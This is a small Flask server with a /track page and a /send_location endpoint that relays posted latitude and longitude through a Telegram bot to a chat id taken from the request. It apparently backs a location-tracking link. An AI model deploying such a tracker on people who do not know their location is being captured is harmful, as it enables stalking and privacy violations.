import os
from flask import Flask, request, render_template
import requests

app = Flask(__name__)

# Bot token will be stored securely as environment variable
BOT_TOKEN = os.environ.get("BOT_TOKEN")

@app.route("/track")
def track():
    return render_template("index.html")

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data["lat"]
    lon = data["lon"]
    user_id = data["id"]

    message = f"📍 Location Received:\nLatitude: {lat}\nLongitude: {lon}"

    requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", params={
        "chat_id": user_id,
        "text": message
    })

    return "ok", 200
